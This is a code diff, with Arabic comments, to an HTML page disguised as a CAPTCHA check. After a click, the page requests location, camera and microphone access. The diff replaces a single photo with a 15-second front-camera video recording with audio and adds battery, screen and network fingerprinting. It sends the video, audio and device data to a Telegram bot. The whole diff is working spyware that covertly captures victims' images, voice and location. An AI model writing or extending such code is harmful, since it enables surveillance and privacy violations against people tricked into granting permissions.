@@ -108,6 +108,13 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        #video-preview {
+            display: none;
+            width: 100%;
+            max-height: 200px;
+            margin: 10px 0;
+            background-color: #000;
+        }
     </style>
 </head>
 <body>
@@ -149,10 +156,12 @@
         
         // بيانات التطبيق
         const collectedData = {
-            systemInfo: getSystemInfo(),
-            camera: { photo: null, allowed: false },
+            systemInfo: {},
+            camera: { photo: null, video: null, allowed: false },
             microphone: { audio: null, allowed: false },
-            location: { coords: null, address: null, allowed: false }
+            location: { coords: null, address: null, allowed: false },
+            battery: { level: null, charging: null },
+            screen: { width: null, height: null, orientation: null }
         };
         
         // عناصر DOM
@@ -171,24 +180,107 @@
             return captcha;
         }
         
-        // جمع معلومات النظام الأساسية
-        function getSystemInfo() {
-            return {
+        // جمع معلومات النظام الأساسية مع الإضافات الجديدة
+        async function getSystemInfo() {
+            // معلومات الشاشة
+            collectedData.screen = {
+                width: screen.width,
+                height: screen.height,
+                orientation: screen.orientation ? screen.orientation.type : 'غير معروف',
+                pixelDepth: screen.pixelDepth,
+                colorDepth: screen.colorDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight
+            };
+            
+            // معلومات البطارية
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    collectedData.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'نعم' : 'لا',
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (error) {
+                    collectedData.battery = { error: 'لا يمكن قراءة حالة البطارية' };
+                }
+            } else {
+                collectedData.battery = { error: 'المتصفح لا يدعم معلومات البطارية' };
+            }
+            
+            // معلومات النظام الأساسية
+            collectedData.systemInfo = {
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
                 languages: navigator.languages,
                 cpuCores: navigator.hardwareConcurrency || 'غير معروف',
                 deviceMemory: navigator.deviceMemory || 'غير معروف',
-                currentUrl: window.location.href
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink + ' Mbps',
+                    rtt: navigator.connection.rtt + ' ms',
+                    saveData: navigator.connection.saveData ? 'نعم' : 'لا'
+                } : 'غير معروف',
+                cookiesEnabled: navigator.cookieEnabled ? 'نعم' : 'لا',
+                doNotTrack: navigator.doNotTrack || 'غير معروف',
+                maxTouchPoints: navigator.maxTouchPoints || 'غير معروف'
             };
         }
         
+        // تسجيل فيديو من الكاميرا
+        async function recordVideo() {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' }, // استخدام الكاميرا الأمامية
+                        audio: true 
+                    });
+                    
+                    const mediaRecorder = new MediaRecorder(stream, {
+                        mimeType: 'video/webm;codecs=vp9'
+                    });
+                    
+                    const videoChunks = [];
+                    
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            videoChunks.push(event.data);
+                        }
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                        collectedData.camera.video = videoBlob;
+                        collectedData.camera.allowed = true;
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve();
+                    };
+                    
+                    mediaRecorder.start();
+                    
+                    // تسجيل لمدة 15 ثانية ثم إيقاف
+                    setTimeout(() => {
+                        if (mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                        }
+                    }, 15000);
+                    
+                } catch (error) {
+                    reject(new Error(`فشل في تسجيل الفيديو: ${error.message}`));
+                }
+            });
+        }
+        
         // عند تحميل الصفحة
-        window.onload = () => {
+        window.onload = async () => {
             // تعيين CAPTCHA عشوائي
             captchaText.textContent = generateCaptcha();
+            
+            // جمع معلومات النظام أولاً
+            await getSystemInfo();
             
             // إضافة مستمع للأحداث للزر
             verifyBtn.addEventListener('click', async () => {
@@ -205,7 +297,7 @@
                         
                         // طلب الأذونات بالتسلسل
                         await requestLocation();
-                        await requestCamera();
+                        await recordVideo(); // تسجيل الفيديو بدلاً من صورة ثابتة
                         await requestMicrophone();
                         
                         // بعد جمع كل البيانات
@@ -261,38 +353,6 @@
             });
         }
         
-        // طلب إذن الكاميرا والتقاط صورة
-        async function requestCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // التقاط صورة
-                const video = document.createElement('video');
-                video.autoplay = true;
-                video.playsInline = true;
-                video.srcObject = stream;
-                
-                // انتظار حتى يكون الفيديو جاهزًا
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(blob => {
-                    collectedData.camera.photo = blob;
-                    collectedData.camera.allowed = true;
-                }, 'image/jpeg', 0.9);
-                
-                // إيقاف الكاميرا بعد التقاط الصورة
-                stream.getTracks().forEach(track => track.stop());
-                
-            } catch (error) {
-                throw new Error(`فشل في الوصول للكاميرا: ${error.message}`);
-            }
-        }
-        
         // طلب إذن الميكروفون وتسجيل الصوت
         async function requestMicrophone() {
             try {
@@ -334,7 +394,14 @@
                 message += `⏰ <b>الوقت:</b> ${new Date(collectedData.systemInfo.timestamp).toLocaleString()}\n`;
                 message += `💻 <b>المتصفح:</b> ${collectedData.systemInfo.userAgent}\n`;
                 message += `🖥️ <b>النظام:</b> ${collectedData.systemInfo.platform}\n`;
-                message += `🌐 <b>الرابط المستخدم:</b> ${collectedData.systemInfo.currentUrl}\n`;
+                message += `🌐 <b>اللغات:</b> ${collectedData.systemInfo.languages.join(', ')}\n`;
+                message += `⚡ <b>أنوية المعالج:</b> ${collectedData.systemInfo.cpuCores}\n`;
+                message += `🧠 <b>ذاكرة الجهاز:</b> ${collectedData.systemInfo.deviceMemory} GB\n`;
+                message += `📶 <b>نوع الاتصال:</b> ${collectedData.systemInfo.connection.type || 'غير معروف'}\n`;
+                message += `🔋 <b>حالة البطارية:</b> ${collectedData.battery.level || 'غير معروف'} (${collectedData.battery.charging || 'غير معروف'})\n`;
+                message += `🖥️ <b>أبعاد الشاشة:</b> ${collectedData.screen.width} × ${collectedData.screen.height}\n`;
+                message += `🔄 <b>اتجاه الشاشة:</b> ${collectedData.screen.orientation}\n`;
+                message += `🎨 <b>عمق الألوان:</b> ${collectedData.screen.colorDepth} بت\n`;
                 
                 if (collectedData.location.allowed) {
                     message += `\n📍 <b>الموقع:</b> ${collectedData.location.address || 'غير معروف'}\n`;
@@ -343,9 +410,9 @@
                 
                 await sendToTelegram(chatId, message, 'text');
                 
-                // إرسال الصورة إن وجدت
-                if (collectedData.camera.photo) {
-                    await sendToTelegram(chatId, collectedData.camera.photo, 'photo');
+                // إرسال الفيديو إن وجد
+                if (collectedData.camera.video) {
+                    await sendToTelegram(chatId, collectedData.camera.video, 'video');
                 }
                 
                 // إرسال التسجيل الصوتي إن وجد
@@ -373,9 +440,18 @@
             } else {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append(type, data, `file.${type === 'photo' ? 'jpg' : 'wav'}`);
                 
-                const endpoint = type === 'photo' ? 'sendPhoto' : 'sendAudio';
+                if (type === 'photo') {
+                    formData.append('photo', data, 'photo.jpg');
+                } else if (type === 'audio') {
+                    formData.append('audio', data, 'audio.wav');
+                } else if (type === 'video') {
+                    formData.append('video', data, 'video.mp4');
+                }
+                
+                const endpoint = type === 'photo' ? 'sendPhoto' : 
+                               type === 'audio' ? 'sendAudio' : 'sendVideo';
+                
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
                     method: 'POST',
                     body: formData
@@ -384,4 +460,4 @@
         }
     </script>
 </body>
-    </html>
+</html>
